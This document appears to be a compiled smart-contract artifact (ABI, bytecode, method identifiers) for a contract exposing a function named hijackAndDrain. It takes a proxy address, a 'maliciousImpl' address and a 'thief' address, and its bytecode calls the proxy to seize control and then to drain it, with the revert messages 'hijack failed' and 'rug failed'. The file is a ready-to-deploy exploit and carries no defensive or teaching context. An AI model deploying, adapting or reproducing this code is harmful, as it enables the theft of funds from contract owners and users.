{"abi":[{"type":"function","name":"hijackAndDrain","inputs":[{"name":"proxy","type":"address","internalType":"address"},{"name":"maliciousImpl","type":"address","internalType":"address"},{"name":"thief","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f80fd5b506105288061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c80632e4277f71461002d575b5f80fd5b61004760048036038101906100429190610318565b610049565b005b5f8373ffffffffffffffffffffffffffffffffffffffff16836040516024016100729190610377565b6040516020818303038152906040527f13af4035000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516100fc91906103fc565b5f604051808303815f865af19150503d805f8114610135576040519150601f19603f3d011682016040523d82523d5f602084013e61013a565b606091505b505090508061017e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101759061046c565b60405180910390fd5b5f8473ffffffffffffffffffffffffffffffffffffffff16836040516024016101a79190610377565b6040516020818303038152906040527f2af45832000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161023191906103fc565b5f604051808303815f865af19150503d805f811461026a576040519150601f19603f3d011682016040523d82523d5f602084013e61026f565b606091505b50509050806102b3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102aa906104d4565b60405180910390fd5b5050505050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6102e7826102be565b9050919050565b6102f7816102dd565b8114610301575f80fd5b50565b5f81359050610312816102ee565b92915050565b5f805f6060848603121561032f5761032e6102ba565b5b5f61033c86828701610304565b935050602061034d86828701610304565b925050604061035e86828701610304565b9150509250925092565b610371816102dd565b82525050565b5f60208201905061038a5f830184610368565b92915050565b5f81519050919050565b5f81905092915050565b5f5b838110156103c15780820151818401526020810190506103a6565b5f8484015250505050565b5f6103d682610390565b6103e0818561039a565b93506103f08185602086016103a4565b80840191505092915050565b5f61040782846103cc565b915081905092915050565b5f82825260208201905092915050565b7f68696a61636b206661696c6564000000000000000000000000000000000000005f82015250565b5f610456600d83610412565b915061046182610422565b602082019050919050565b5f6020820190508181035f8301526104838161044a565b9050919050565b7f727567206661696c6564000000000000000000000000000000000000000000005f82015250565b5f6104be600a83610412565b91506104c98261048a565b602082019050919050565b5f6020820190508181035f8301526104eb816104b2565b905091905056fea264697066735822122096e4b4fe7e0d3e8fa4b73272b461b47af5cbf84c1c621b4b1fa2115d17ff1d1164736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"hijackAndDrain(address,address,address)":"2e4277f7"},"id":29}